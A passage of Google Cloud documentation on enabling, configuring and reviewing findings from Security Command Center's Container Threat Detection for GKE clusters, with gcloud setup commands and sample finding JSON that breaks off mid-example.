---
url: https://docs.cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection/
title: Use Container Threat Detection \u00a0|\u00a0 Security Command Center \u00a0|\u00a0 Google Cloud Documentation
method: scrapling+scrapegraph
fetched_at: 2026-10-23T11:31:02.496254+00:00
---

# Use Container Threat Detection  |  Security Command Center  |  Google Cloud Documentation

> Source: https://docs.cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection/

  * [ Home ](https://docs.cloud.google.com/)
  * [ Documentation ](https://docs.cloud.google.com/docs)
  * [ Security ](https://docs.cloud.google.com/docs/security)
  * [ Security Command Center ](https://docs.cloud.google.com/security-command-center/docs)
  * [ Guides ](https://docs.cloud.google.com/security-command-center/docs/security-command-center-overview)



Send feedback 

#  Use Container Threat Detection Stay organized with collections  Save and categorize content based on your preferences. 

Premium and Enterprise (Deprecated) [service tiers](https://docs.cloud.google.com/security-command-center/docs/service-tiers) The Security Command Center Enterprise service tier will shut down on May 21, 2027. If your organization uses the Enterprise service tier, then the organization will automatically move to the Premium service tier on or after May 21, 2027. Contact your account representative or a [Google Cloud sales specialist](https://cloud.google.com/contact) if you have questions. 

This page shows you how to review Container Threat Detection findings in the Google Cloud console and includes examples of Container Threat Detection findings.

Container Threat Detection is a built-in service of the Premium and Enterprise tiers of Security Command Center.

To view Container Threat Detection findings, the service must be enabled in Security Command Center [Services](https://docs.cloud.google.com/security-command-center/docs/how-to-configure-security-command-center#enable-service) settings.

Learn more about viewing and managing Container Threat Detection findings in Reviewing findings on this page.

To activate Container Threat Detection and other Premium tier detectors at the project level, see [Activate Security Command Center for a project](https://docs.cloud.google.com/security-command-center/docs/activate-scc-for-a-project). The Enterprise tier does not support project-level activations.

## Use a supported GKE version

**Note:** Container Threat Detection is not compatible with [GKE Sandbox](https://docs.cloud.google.com/kubernetes-engine/docs/concepts/sandbox-pods). This feature must be disabled on GKE clusters where you want Container Threat Detection deployed.

To detect potential threats to your containers, make sure that your clusters are on a supported version of Google Kubernetes Engine (GKE). Container Threat Detection supports the following GKE versions for Container-Optimized OS-based x86 clusters on the Stable, Regular, and Rapid [channels](https://docs.cloud.google.com/kubernetes-engine/docs/concepts/release-channels):

  * GKE Standard >= 1.15.9-gke.12
  * GKE Standard >= 1.16.5-gke.2
  * GKE Standard >= 1.17
  * GKE Standard >= 1.18.10-gke.1400
  * GKE Standard >= 1.19.2-gke.2000
  * GKE Standard >= 1.20
  * GKE Standard >= 1.21
  * GKE Autopilot >= 1.21.11-gke.900
  * GKE Standard and Autopilot >= 1.22
  * GKE Standard and Autopilot >= 1.23



Container Threat Detection supports the following GKE versions for Ubuntu-based x86 clusters on the Stable, Regular, and Rapid [channels](https://docs.cloud.google.com/kubernetes-engine/docs/concepts/release-channels):

  * GKE Standard and Autopilot >= 1.28.15-gke.1480000
  * GKE Standard and Autopilot >= 1.29.12-gke.1120000
  * GKE Standard and Autopilot >= 1.30.8-gke.1128000
  * GKE Standard and Autopilot >= 1.31.4-gke.1177000
  * GKE Standard and Autopilot >= 1.32



Container Threat Detection supports the following GKE versions for Container-Optimized OS-based Arm clusters on the Stable, Regular, and Rapid [channels](https://docs.cloud.google.com/kubernetes-engine/docs/concepts/release-channels):

  * GKE Standard and Autopilot >= 1.28



The Container Threat Detection file monitoring detectors ([Preview](https://cloud.google.com/products/#product-launch-stages)) are supported on the following GKE versions for Container-Optimized OS-based nodes, both x86 and Arm:

  * GKE Standard and Autopilot >= 1.30



The Container Threat Detection file monitoring detectors ([Preview](https://cloud.google.com/products/#product-launch-stages)) are also supported on the following GKE versions for Ubuntu-based x86 nodes:

  * GKE Standard and Autopilot >= 1.32



## Enable Container Threat Detection

When you activate the Premium or Enterprise tier of Security Command Center, Container Threat Detection is enabled by default, unless you choose to disable it during the activation process.

If you need to enable or disable Container Threat Detection for your organization or project, you can do so on the Security Command Center **Settings** page. For more information, see [Enable or disable a built-in service](https://docs.cloud.google.com/security-command-center/docs/how-to-configure-security-command-center#enable-service).

When you enable Container Threat Detection, either by activating Security Command Center or later, do the following:

  1. For any clusters that are not on a supported version of GKE, complete the steps in the guide to [upgrade a cluster](https://docs.cloud.google.com/kubernetes-engine/docs/how-to/upgrading-a-cluster).
  2. Ensure your clusters have sufficient resources available to run the Container Threat Detection DaemonSet.
  3. In the Google Cloud console, review the [Container Threat Detection service enablement settings](https://console.cloud.google.com/security/command-center/config/services/container-threat-detection/enablement) to ensure that Container Threat Detection is enabled for your clusters.



### Required IAM permissions

Container Threat Detection requires permission to enable and disable itself and manage the Container Threat Detection agent on GKE clusters.

To give the required permission, the IAM role **Container Threat Detection Service Agent** (`roles/containerthreatdetection.serviceAgent`) must be granted to the Container Threat Detection service agent, which is a type of service account.

Removing this default role from the service agent could stop Container Threat Detection from functioning properly.

Depending on how and when Security Command Center was activated, the name of the service agent that Container Threat Detection uses is different:

  * If Security Command Center was activated **before December 7, 2023** , Container Threat Detection uses the following user-managed service agent:

`service-PROJECT_NUMBER@gcp-sa-ktd-control.iam.gserviceaccount.com`

  * If Security Command Center was activated at the **organization level after December 7, 2023** , Container Threat Detection uses the following user-managed organization-level service agent:

`service-org-ORGANIZATION_ID@gcp-sa-ktd-hpsa.iam.gserviceaccount.com`

  * If Security Command Center was activated at the **project level after December 7, 2023** , Container Threat Detection uses the following user-managed organization-level service agent:

`service-project-PROJECT_NUMBER@gcp-sa-ktd-hpsa.iam.gserviceaccount.com`




For more information about service agents and IAM roles, see the following:

  * [Service agents](https://docs.cloud.google.com/iam/docs/service-agents)
  * [Container Threat Detection Service Agent](https://docs.cloud.google.com/iam/docs/roles-permissions/containerthreatdetection#containerthreatdetection.serviceAgent)



### Permissions required for custom GKE node service account

When you use a custom service account for your GKE nodes, the new node service account needs permissions to interact with Container Threat Detection. To give these permissions to the service account, you grant it the Service Account Token Creator role (`roles/iam.serviceAccountTokenCreator`).

  1. Grant the Service Account Token Creator role to the node service account:
         
         gcloud iam service-accounts add-iam-policy-binding \
           SERVICE_ACCOUNT_NAME \
           --member=serviceAccount:service-PROJECT_NUMBER@compute-system.iam.gserviceaccount.com \
           --role=roles/iam.serviceAccountTokenCreator
         

Replace the following values:

     * Replace SERVICE_ACCOUNT_NAME with the email address of your new node service account.
     * Replace PROJECT_NUMBER with the project number where Container Threat Detection is deployed. This is crucial if it's different from the service account's project.
  2. Enable the Container Threat Detection API on the same project where the new node service account was created:
         
         gcloud services enable containerthreatdetection.googleapis.com --project PROJECT_ID
         

Replace PROJECT_ID with the ID of the project where the new node service account resides.




## Check GKE cluster configuration

For Container Threat Detection to work, if your cluster is in a [Virtual Private Cloud (VPC)](https://docs.cloud.google.com/vpc/docs/overview), its network must meet the routing, firewall, and DNS requirements to communicate with Google APIs and services. To access Google APIs, review the following guides:

  * If your cluster is a private cluster, see [Configuring Private Google Access](https://docs.cloud.google.com/vpc/docs/configure-private-google-access) or [Configuring Private Service Connect](https://docs.cloud.google.com/vpc/docs/configure-private-service-connect-apis).
  * If your cluster is within a VPC Service Controls service perimeter, make sure you follow the instructions at service perimeter overview.
  * If your cluster is not a private cluster, see [Accessing APIs from VMs with external IP addresses](https://docs.cloud.google.com/vpc/docs/access-apis-external-ip).



Also, your GKE cluster configuration or [organization policy constraints](https://docs.cloud.google.com/resource-manager/docs/organization-policy/org-policy-constraints) must not block the creation or use of any objects that Container Threat Detection needs to function. The following sections include a list of GKE objects that Container Threat Detection creates and explain how to configure essential GKE components to work with Container Threat Detection.

### Kubernetes objects

After onboarding, Container Threat Detection creates several GKE objects in your enabled clusters. The objects are used to monitor container images, manage privileged containers and pods, and evaluate state to generate findings. The following table lists the objects, their properties, and essential functions.

Object | Name1 | Properties | Function  
---|---|---|---  
ClusterRole | `container-watcher-pod-reader` | Grants `get`, `watch`, and `list` permissions on pods |   
ClusterRole | `pod-reader` | Grants `get`, `watch`, and `list` permissions on pods |   
ClusterRoleBinding  |  `container-watcher-pod-reader` `gce:podsecuritypolicy:container-watcher` | Grants `container-watcher-pod-reader` and `gce:podsecuritypolicy:privileged` roles to `container-watcher-pod-reader` ServiceAccount  |   
CustomResourceDefinition | `containerwatcherstatuses.containerthreatdetection.googleapis.com` |  | DaemonSet status reporting  
DaemonSet | `container-watcher`2 | Privileged | Interactions with the eBPF-based kernel module and container engine  
Mounts /host/ as read and write | Communication with the eBPF-based kernel module  
Mounts /etc/container-watcher/secrets as read-only to access `container-watcher-token` | Authentication  
Uses `hostNetwork` | Finding generation  
Image  
gke.gcr.io/watcher-daemonset  | Enablement and upgrade  
Backend  
containerthreatdetection-REGION.googleapis.com:443  | Finding generation  
Role | `container-watcher-status-reporter` | Role with `get`, `list`, `watch`, `create`, `update`, `patch` verbs for the `containerwatcherstatuses.containerthreatdetection.googleapis.com` CustomResourceDefinition | Allows updating DaemonSet status information  
RoleBinding | `gce:podsecuritypolicy:container-watcher` | Grants `gce:podsecuritypolicy:privileged` role to `container-watcher-pod-reader` ServiceAccount | Preserves functionality when `PodSecurityPolicy` is enabled  
`container-watcher-status-reporter` | Grants `container-watcher-status-reporter` role to `container-watcher-pod-reader` ServiceAccount |   
Secret | `container-watcher-token` |  | Authentication  
ServiceAccount | `container-watcher-pod-reader` |  | Enablement, upgrade, and disablement  
  
1 All objects are in the `kube-system` namespace, except `container-watcher-pod-reader` and `gce:podsecuritypolicy:container-watcher`.

2 During the installation, update, or removal of Container Threat Detection, Kubernetes might generate error messages for Kubernetes objects or other dependencies that are momentarily missing or incomplete. For example, there might be an instance where the `container-watcher-pod-reader` role is missing, which prevents the installation of the pod watcher. This also generates error logs such as `serviceaccount "container-watcher-pod-reader" not found`. Typically, these errors resolve automatically after Container Threat Detection completes the process. Unless the errors persist beyond a few minutes, they can be safely ignored.

### PodSecurityPolicy and Admission Controllers

A [PodSecurityPolicy](https://docs.cloud.google.com/kubernetes-engine/docs/how-to/pod-security-policies) is an admission controller resource you set up that validates requests to create and update pods on your cluster. Container Threat Detection is compatible with PodSecurityPolicies that are automatically applied when creating or updating a cluster with the `enable-pod-security-policy` flag. Specifically, Container Threat Detection uses the `gce.privileged` policy when PodSecurityPolicy is enabled.

If you use custom PodSecurityPolicies or other admission controllers, they must not block the creation or use of objects Container Threat Detection needs to function. For example, a webhook-based admission controller that rejects or overrides privileged deployments could prevent Container Threat Detection from functioning properly.

For more information, see [Using PodSecurityPolicies](https://docs.cloud.google.com/kubernetes-engine/docs/how-to/pod-security-policies).

**Note:** PodSecurityPolicy admission controllers are deprecated and will not be included with GKE version 1.25 and later. GKE recommends migrating to a [`PodSecurity` admission controller](https://docs.cloud.google.com/kubernetes-engine/docs/how-to/podsecurityadmission). Container Threat Detection is compatible with PodSecurity admission controllers and GKE version 1.25 and later.

## Enable or disable Container Threat Detection modules

If the Container Threat Detection service is enabled, you can set the enablement state of its individual modules.

  1. In the Google Cloud console, go to the **Modules** page for Container Threat Detection. 

[Go to Modules](https://console.cloud.google.com/projectselector2/security/command-center/config/services/container-threat-detection/modules?supportedpurview=organizationId,project)

  2. Select your organization or project.
  3. On the **Modules** tab, in the **Status** column, select the current status of the module that you want to enable or disable, and then select one of the following: 
     * **Enable** : Enable the module.
     * **Disable** : Disable the module.



**Note:** If you disable Container Threat Detection, Security Command Center also disables the individual Container Threat Detection modules and stores their previous enablement states. If you re-enable Container Threat Detection, Security Command Center restores the modules to their previous enablement states. 

## Exclude environment variables from Container Threat Detection findings

By default, when Container Threat Detection generates a finding, it reports environment variables for all processes referenced in the finding. Environment variable values can be important when investigating an attack. However, some software packages store secrets and other sensitive information in environment variables. To prevent Container Threat Detection from including process environment variables in any Container Threat Detection finding, disable the `REPORT_ENVIRONMENT_VARIABLES` module using the [Google Cloud CLI](https://docs.cloud.google.com/sdk/gcloud) or the Security Command Center Management API's [`securityCenterServices.patch`](https://docs.cloud.google.com/security-command-center/docs/reference/security-center-management/rest/v1/organizations.locations.securityCenterServices/patch) method at the organization, folder, or project level.

For example, to disable environment variable reporting in a project, create a file named `module_config.yaml` with the following contents:
    
    
    REPORT_ENVIRONMENT_VARIABLES:
      intendedEnablementState: DISABLED
    

Then run the following command:
    
    
    gcloud scc manage services update container-threat-detection \
        --module-config-file=module_config.yaml \
        --project=PROJECT_ID
    

To restore the default behavior, edit `module_config.yaml` so that it contains the following, and then run the command again:
    
    
    REPORT_ENVIRONMENT_VARIABLES:
      intendedEnablementState: ENABLED
    

To see all of the gcloud CLI commands for managing services, see [`gcloud scc manage services`](https://docs.cloud.google.com/sdk/gcloud/reference/scc/manage/services).

## Exclude CLI arguments from Container Threat Detection findings

All processes have one or more command line (CLI) arguments. By default, when Container Threat Detection includes process details in a finding, it records the CLI arguments of the process. CLI argument values can be important when investigating an attack. However, some users may pass secrets and other sensitive information in CLI arguments. To prevent Container Threat Detection from including process CLI arguments in any Container Threat Detection finding, disable the `REPORT_CLI_ARGUMENTS` module using [Google Cloud CLI](https://docs.cloud.google.com/sdk/gcloud) or the Security Command Center Management API's [`securityCenterServices.patch`](https://docs.cloud.google.com/security-command-center/docs/reference/security-center-management/rest/v1/organizations.locations.securityCenterServices/patch) method at the organization, folder, or project level.

For example, to disable CLI argument reporting in a project, create a file named `module_config.yaml` with the following contents:
    
    
    REPORT_CLI_ARGUMENTS:
      intendedEnablementState: DISABLED
    

Then run the following command:
    
    
    gcloud scc manage services update container-threat-detection \
        --module-config-file=module_config.yaml \
        --project=PROJECT_ID
    

To restore the default behavior, edit `module_config.yaml` so that it contains the following, and then run the command again:
    
    
    REPORT_CLI_ARGUMENTS:
      intendedEnablementState: ENABLED
    

To see all of the gcloud CLI commands for managing services, see [`gcloud scc manage services`](https://docs.cloud.google.com/sdk/gcloud/reference/scc/manage/services).

## Resource usage

Container Threat Detection is designed to be non-intrusive to your clusters and is expected to have a negligible performance impact on your cluster operations.

Your resource usage depends on your workload. However, the core components of Container Threat Detection—the userspace DaemonSet and its eBPF programs—have an estimated performance impact of a maximum of 0.125 vCPU and 450 MB of memory, based on hard limits set to restrict resource usage. We occasionally reevaluate these limits and might change them in the future to optimize performance, particularly for very large nodes.

If you are a BigQuery customer, you can enable [GKE usage metering](https://docs.cloud.google.com/kubernetes-engine/docs/how-to/cluster-usage-metering) to monitor the resource usage of Container Threat Detection's userspace DaemonSet. To view the userspace DaemonSet in usage metering, search for namespace `kube-system` and label `k8s-app=container-watcher`.

GKE usage metering can't track kernel CPU usage specifically for the eBPF-based kernel module. That data is included in overall CPU usage.

## Container Threat Detection API

Container Threat Detection automatically enables the [containerthreatdetection API](https://console.cloud.google.com/marketplace/product/google/containerthreatdetection.googleapis.com) during onboarding to allow finding generation. You should not interact directly with this required API. Disabling this API would damage Container Threat Detection's ability to generate new findings. If you want to stop receiving Container Threat Detection findings, disable Container Threat Detection in Security Command Center [Services](https://docs.cloud.google.com/security-command-center/docs/how-to-configure-security-command-center#enable-service) settings.

## Review findings

When Container Threat Detection generates findings, you can view them in Security Command Center. If you [configured log exports to Cloud Logging](https://docs.cloud.google.com/security-command-center/docs/export-cloud-logging), you can also view findings in Cloud Logging. To generate a finding and verify your configuration, you can intentionally trigger a detector and [test Container Threat Detection](https://docs.cloud.google.com/security-command-center/docs/how-to-test-container-threat-detection).

**Note:** Continuous Exports isn't supported if you activate Security Command Center at the project level.

Container Threat Detection has the following latencies: 

  * Activation latency of 3.5 hours for newly onboarded organizations or projects.
  * Activation latency of minutes for newly created clusters.
  * Detection latency of minutes for threats in clusters that have been activated.



### Review findings in the Google Cloud console

The IAM roles for Security Command Center can be granted at the organization, folder, or project level. Your ability to view, edit, create, or update findings, assets, and security sources depends on the level that you're granted access for. To learn more about Security Command Center roles, see [Access control](https://docs.cloud.google.com/security-command-center/docs/access-control). 

To review Container Threat Detection findings in Security Command Center follow these steps.

If [data residency](https://docs.cloud.google.com/security-command-center/docs/data-residency-support) is enabled for your organization, you must access the page using the jurisdictional console. For more information, see [Use the console with data residency enabled](https://docs.cloud.google.com/security-command-center/docs/how-to-use-security-command-center#console-jconsole).

  1. In the Google Cloud console, go to the **Findings** page of Security Command Center.

[Go to Findings](https://console.cloud.google.com/security/command-center/findingsv2)

  2. Select your Google Cloud project or organization.
  3. In the **Quick filters** section, in the **Source display name** subsection, select **Container Threat Detection**. The findings query results are updated to show only the findings from this source. 
  4. To view the details of a specific finding, click the finding name in the **Category** column. The details panel for the finding opens and displays the **Summary** tab. 
  5. On the **Summary** tab, review the details of the finding, including information about what was detected, the affected resource, and—if available—steps that you can take to remediate the finding. 
  6. Optional: To view the full JSON definition of the finding, click the **JSON** tab.



To aid in your investigation, threat findings also contain links to the following external resources:

  * [MITRE ATT&CK](https://attack.mitre.org/) framework entries. The framework explains techniques for attacks against cloud resources and provides remediation guidance.
  * [VirusTotal](https://www.virustotal.com/gui/home/search), an Alphabet-owned service that provides context on potentially malicious files, scripts, URLs, and domains.



For a list of Container Threat Detection findings, see [Container Threat Detection detectors](https://docs.cloud.google.com/security-command-center/docs/concepts-container-threat-detection-overview#detectors).

### View findings in Cloud Logging

To view Container Threat Detection findings in Cloud Logging, do the following:

  1. Go to **Logs Explorer** in the Google Cloud console.

[Go to Logs Explorer](https://console.cloud.google.com/logs/query)

  2. Select the Google Cloud project or other Google Cloud resource where you are storing your Event Threat Detection logs.

  3. Use the **Query** pane to build your query in one of the following ways:

     * In the **All resources** list, do the following: 
       1. Select **Threat Detector** to display a list of all the detectors.
       2. To view findings from all detectors, select **all detector_name**. To view findings from a specific detector, select its name.
       3. Click **Apply**. The **Query results** table is updated with the logs you selected.
     * Enter the following query in the query editor and click **Run query** :
           
           resource.type="threat_detector"

The **Query results** table is updated with the logs you selected.

  4. To view a log, select a table row, and then click **Expand nested fields**.




You can create [advanced log queries](https://docs.cloud.google.com/logging/docs/view/advanced-queries) to specify a set of log entries from any number of logs.

### Example finding formats

This section provides examples of JSON output for Container Threat Detection findings. You see this output when you [export findings](https://docs.cloud.google.com/security-command-center/docs/how-to-export-data#export-console) using the Google Cloud console or [list findings](https://docs.cloud.google.com/security-command-center/docs/how-to-api-list-findings) using the Security Command Center API or the Google Cloud CLI.

The examples on this page show different types of findings. Each example includes only the fields that are most relevant to that type of finding. For a complete list of fields that are available in a finding, see the Security Command Center API documentation for the [`Finding`](https://docs.cloud.google.com/security-command-center/docs/reference/rest/v2/organizations.sources.findings) resource.

Information from Kubernetes and containerd is provided on a best-effort basis.

#### Added Binary Executed
    
    
    {
      "finding": {
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "state": "ACTIVE",
        "category": "Added Binary Executed",
        "sourceProperties": {
          "VM_Instance_Name": "INSTANCE_ID",
          "Added_Binary_Kind": "Added",
          "Container_Image_Id": "CONTAINER_IMAGE_ID",
          "Container_Name": "CONTAINER_NAME",
          "Parent_Pid": 1.0,
          "Container_Image_Uri": "CONTAINER_IMAGE_URI",
          "Process_Creation_Timestamp": {
            "seconds": 1.617989997E9,
            "nanos": 1.17396995E8
          },
          "Pid": 53.0,
          "Pod_Namespace": "default",
          "Process_Binary_Fullpath": "BINARY_PATH",
          "Process_Arguments": ["BINARY_PATH"],
          "Pod_Name": "POD_NAME",
          "description": "A binary that was not part of the original container image
          was executed. If an added binary is executed by an attacker, this is a
          possible sign that an attacker has control of the workload and they are
          executing arbitrary commands.",
          "Environment_Variables": ["KUBERNETES_PORT\u003dtcp://IP_ADDRESS:PORT",
          "KUBERNETES_SERVICE_PORT\u003d443", "HOSTNAME\u003dreconnect-
          test-4af235e12be6f9d9", "HOME\u003d/root",
          "KUBERNETES_PORT_443_TCP_ADDR\u003dIP_ADDRESS",
          "PATH\u003d/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
          "KUBERNETES_PORT_443_TCP_PORT\u003d443",
          "KUBERNETES_PORT_443_TCP_PROTO\u003dtcp",
          "DEBIAN_FRONTEND\u003dnoninteractive",
          "KUBERNETES_PORT_443_TCP\u003dtcp://IP_ADDRESS:PORT",
          "KUBERNETES_SERVICE_PORT_HTTPS\u003d443",
          "KUBERNETES_SERVICE_HOST\u003dIP_ADDRESS", "PWD\u003d/"],
          "Container_Creation_Timestamp": {
            "seconds": 1.617989918E9,
            "nanos": 0.0
          }
        },
        "securityMarks": {
          "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID/securityMarks"
        },
        "eventTime": "2021-04-09T17:39:57.527Z",
        "createTime": "2021-04-09T17:39:57.625Z",
        "propertyDataTypes": {
          "Container_Image_Id": {
            "primitiveDataType": "STRING"
          },
          "Pod_Namespace": {
            "primitiveDataType": "STRING"
          },
          "Container_Creation_Timestamp": {
            "dataType": "TIMESTAMP",
            "structValue": {
              "fields": {
                "seconds": {
                  "primitiveDataType": "NUMBER"
                },
                "nanos": {
                  "primitiveDataType": "NUMBER"
                }
              }
            }
          },
          "Environment_Variables": {
            "listValues": {
              "propertyDataTypes": [{
                "primitiveDataType": "STRING"
              }]
            }
          },
          "Added_Binary_Kind": {
            "primitiveDataType": "STRING"
          },
          "description": {
            "primitiveDataType": "STRING"
          },
          "Pid": {
            "primitiveDataType": "NUMBER"
          },
          "Process_Arguments": {
            "listValues": {
              "propertyDataTypes": [{
                "primitiveDataType": "STRING"
              }]
            }
          },
          "Container_Image_Uri": {
            "primitiveDataType": "STRING"
          },
          "Pod_Name": {
            "primitiveDataType": "STRING"
          },
          "Process_Creation_Timestamp": {
            "dataType": "TIMESTAMP",
            "structValue": {
              "fields": {
                "seconds": {
                  "primitiveDataType": "NUMBER"
                },
                "nanos": {
                  "primitiveDataType": "NUMBER"
                }
              }
            }
          },
          "Parent_Pid": {
            "primitiveDataType": "NUMBER"
          },
          "VM_Instance_Name": {
            "primitiveDataType": "STRING"
          },
          "Container_Name": {
            "primitiveDataType": "STRING"
          },
          "Process_Binary_Fullpath": {
            "primitiveDataType": "STRING"
          }
        },
        "severity": "LOW",
        "workflowState": "NEW",
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID"
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "projectName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "projectDisplayName": "PROJECT_ID",
        "parentName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "parentDisplayName": "PROJECT_ID",
        "type": "google.container.Cluster"
      }
    }
        

#### Added Library Loaded
    
    
    {
      "finding": {
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findingsFINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "state": "ACTIVE",
        "category": "Added Library Loaded",
        "sourceProperties": {
          "Process_Arguments": ["BINARY_PATH", "ADDED_LIBRARY_NAME"],
          "Parent_Pid": 1.0,
          "Container_Name": "CONTAINER_NAME",
          "Added_Library_Fullpath": "ADDED_LIBRARY_PATH",
          "Container_Image_Id": "CONTAINER_IMAGE_ID",
          "Container_Creation_Timestamp": {
            "seconds": 1.618004144E9,
            "nanos": 0.0
          },
          "Pod_Name": "POD_NAME",
          "Pid": 7.0,
          "description": "A library that was not part of the original container
          image was loaded. If an added library is loaded, this is a possible sign
          that an attacker has control of the workload and they are executing
          arbitrary code.",
          "VM_Instance_Name": "INSTANCE_ID",
          "Pod_Namespace": "default",
          "Environment_Variables": ["KUBERNETES_SERVICE_PORT\u003d443",
          "KUBERNETES_PORT\u003dtcp://IP_ADDRESS:PORT", "HOSTNAME\u003dsuspicious-
          library", "LD_LIBRARY_PATH\u003d/tmp", "PORT\u003d8080",
          "HOME\u003d/root", "PYTHONUNBUFFERED\u003d1",
          "KUBERNETES_PORT_443_TCP_ADDR\u003dIP_ADDRESS",
          "PATH\u003d/opt/python3.7/bin:/opt/python3.6/bin:/opt/python3.5/bin:/opt/p
          ython3.4/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
          , "KUBERNETES_PORT_443_TCP_PORT\u003d443",
          "KUBERNETES_PORT_443_TCP_PROTO\u003dtcp", "LANG\u003dC.UTF-8",
          "DEBIAN_FRONTEND\u003dnoninteractive",
          "KUBERNETES_SERVICE_PORT_HTTPS\u003d443",
          "KUBERNETES_PORT_443_TCP\u003dtcp://IP_ADDRESS:PORT",
          "KUBERNETES_SERVICE_HOST\u003dIP_ADDRESS", "PWD\u003d/home/vmagent/app"],
          "Process_Binary_Fullpath": "BINARY_PATH",
          "Added_Library_Kind": "Added",
          "Container_Image_Uri": "CONTAINER_IMAGE_uri"
        },
        "securityMarks": {
          "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID/securityMarks"
        },
        "eventTime": "2021-04-09T21:36:13.069Z",
        "createTime": "2021-04-09T21:36:13.267Z",
        "propertyDataTypes": {
          "Container_Image_Id": {
            "primitiveDataType": "STRING"
          },
          "Added_Library_Fullpath": {
            "primitiveDataType": "STRING"
          },
          "Container_Creation_Timestamp": {
            "dataType": "TIMESTAMP",
            "structValue": {
              "fields": {
                "seconds": {
                  "primitiveDataType": "NUMBER"
                },
                "nanos": {
                  "primitiveDataType": "NUMBER"
                }
              }
            }
          },
          "Pod_Namespace": {
            "primitiveDataType": "STRING"
          },
          "Environment_Variables": {
            "listValues": {
              "propertyDataTypes": [{
                "primitiveDataType": "STRING"
              }]
            }
          },
          "description": {
            "primitiveDataType": "STRING"
          },
          "Process_Arguments": {
            "listValues": {
              "propertyDataTypes": [{
                "primitiveDataType": "STRING"
              }]
            }
          },
          "Pid": {
            "primitiveDataType": "NUMBER"
          },
          "Container_Image_Uri": {
            "primitiveDataType": "STRING"
          },
          "Pod_Name": {
            "primitiveDataType": "STRING"
          },
          "Added_Library_Kind": {
            "primitiveDataType": "STRING"
          },
          "Parent_Pid": {
            "primitiveDataType": "NUMBER"
          },
          "VM_Instance_Name": {
            "primitiveDataType": "STRING"
          },
          "Container_Name": {
            "primitiveDataType": "STRING"
          },
          "Process_Binary_Fullpath": {
            "primitiveDataType": "STRING"
          }
        },
        "severity": "LOW",
        "workflowState": "NEW",
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID"
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "projectName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "projectDisplayName": "PROJECT_ID",
        "parentName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "parentDisplayName": "PROJECT_ID",
        "type": "google.container.Cluster"
      }
    }
      

#### Command and Control: Steganography Tool Detected ([Preview](https://cloud.google.com/products/#product-launch-stages))
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Command and Control: Steganography Tool Detected",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "COMMAND_AND_CONTROL",
          "primaryTechniques": [
            "DATA_OBFUSCATION"
          ],
          "additionalTactics": [
            "DEFENSE_EVASION"
          ],
          "additionalTechniques": [
            "OBFUSCATED_FILES_OR_INFO"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
